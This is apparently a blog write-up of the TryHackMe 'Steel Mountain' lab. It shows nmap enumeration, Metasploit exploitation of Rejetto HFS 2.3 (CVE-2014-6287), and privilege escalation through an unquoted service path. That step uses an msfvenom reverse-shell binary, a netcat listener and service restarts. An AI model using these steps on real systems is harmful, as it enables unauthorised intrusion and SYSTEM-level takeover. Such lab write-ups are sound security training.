---
title: Tryhackme Steel Mountaing CTF Writeup
author: krygennn
date: 2021-10-9 00:59
categories: [Blogging,cyber-security,tryhackme]
image:
    src: /assets/img/posts/tryhackme-steel-mountain-ctf-writeup/1.jpg
    alt: TRYHACKME STEEL MOUNTAIN
tags: [ctf,pentesting,remote-code-execution,windows-privesc,powershell,metasploit,unqoted-service-path]
---
[**Solve Yourself >>**](https://tryhackme.com/room/steelmountain)


The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
vulnerabilities that occur on the system.

# FIRST METHOD
## 1-Preperation
Export the ip address of the machine as a variable for shorthand usage.
<br>-> `export ip={MACHINE IP}`
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/2.jpg){:.normal}

## 2-Enumeration 
Let us run Network Mapper (**nmap**) to discover opened ports and services.   

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Full command : `nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}`
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/3.jpg){:.normal}<br><br>
There is a web server running on port **80**, let us visit.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/4.jpg){:.normal}<br><br>
There is also one more web server is running at port **8080**
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/5.jpg){:.normal}<br><br>
If you click on the **HttpFileServer2.3** link under the **Server Information** heading, it will redirect you to the following page.
It seems the HTTP server is being run by **rejetto**.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/6.jpg){:.normal}<br><br>
There is a vulnerablity on the **Rejetto HFS versions 2.3, 2.3a, and 2.3b**, let's check.<br>
[**CVE-Database -> Rejetto HFS 2.3**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287)
<br>[**More detailed explaination**](https://www.kb.cert.org/vuls/id/251276)
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/7.jpg){:.normal}<br><br>

## 3-Exploitation

### Gaining Access to the System - Getting User Flag
Launch up your **msfconsole** and do a search for **CVE-2014-6287** to see if there is any exploit that we can use.
There is one with an excellent rank, awesome! Let us use it.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg){:.normal}<br><br>
Copy the THM IP with that command: `ifconfig | grep -C 1 tun0 | tail -n 1 | awk '{print $2}'`
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg){:.normal}<br><br>
-> set RPORT `8080`<br>-> set RHOST `machine IP`<br>-> set LHOST `your THM IP`<br>-> exploit

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|RPORT                   | The target port (TCP)                                  |
|RHOST                   | Address of the target                                  |
|LPORT                   | The listen port                                        |

![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg){:.normal}<br><br>
After receiving meterpreter session, run `shell` to get an interactive shell.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg){:.normal}<br><br>
Find the flag under **C:\users\bill\Desktop** directory.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg){:.normal}<br><br>

### Escalate the privileges - Getting the Root flag

After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
permissions against the system. **PowerUp.ps1** is a program that facilitates fast checks in a windows machine to identify 
any misconfigurations and privilege escalation possibilities.
<br>-> [**Download PowerUp.ps1**](../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1)
<br>-> Run `exit` and get back to the **meterpreter** session.
<br>-> Upload the script just as we did before to the machine.
<br>-> Run `load powershell`
<br>-> Run `powershell_shell`
<br>You will get **PowerShell** this time instead of a regular **cmd prompt**.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg){:.normal}<br><br>
<br>-> Run `. .\PowerUp.ps1`
<br>-> Run `Invoke-AllChecks`
<br>**InvokeAllChecks** will diagnose any detectable vulnerabilities along with their descriptions.
<br><br>The first result we got is a service called **AdvancedSystemCare9**, and it has a vulnerability called 
**Unquoted Service Path** [**-> Read more about it**](). We will abuse this vulnerability. 
<br>**CanRestart** field means that the current user, in this case, **bill**, can manually restart the service even though
the service itself is being run with **LocalSystem** service account permissions, which has the top-level privileges.
<br>[**LocalSystem Service Account**](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN)
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/14.jpg){:.normal}<br><br>

Launch up **msfvenom** to deploy a reverse shell binary. 

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|LHOST                   | The IP address that the reverse shell will connect     |
|LPORT                   | The port that the reverse shell will connect           |
|-p                      | Payload to use                                         |
|-o                      | Name of the file                                       |
|-f                      | File type of the output binary                         |

Full command -> <br>`msfvenom -p windows/shell_reverse_tcp LHOST={THM IP} LPORT={RANDOM FREE PORT} -f exe -o {somename}.exe`
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg){:.normal}<br><br>

-> Upload the binary to the target machine.
<br>-> Get the `shell` again.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg){:.normal}<br><br>

-> Relocate the binary into **C:\Program Files (x86)\IObit** directory.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/17.jpg){:.normal}<br><br>

-> Rename the binary to **Advanced.exe**.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg){:.normal}<br><br>

Start a **netcat** listener on your machine with the port that is defined when creating
the backdoor.
<br>-> `nc -nvlp {SPECIFIED PORT}`
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg){:.normal}<br><br>

After starting a netcat session, restart the service
<br>-> `sc stop AdvancedSystemCareService9`
<br>-> `sc start AdvancedSystemCareService9`
<br>When the service boots, **Advanced.exe** backdoor binary will be executed instead of the **ASCService.exe**. 
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg){:.normal}<br><br>
You can find the root flag **root.txt** under **C:\Users\Administrator\Desktop** directory.

# SECOND METHOD

In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.
<br> To be continued ...
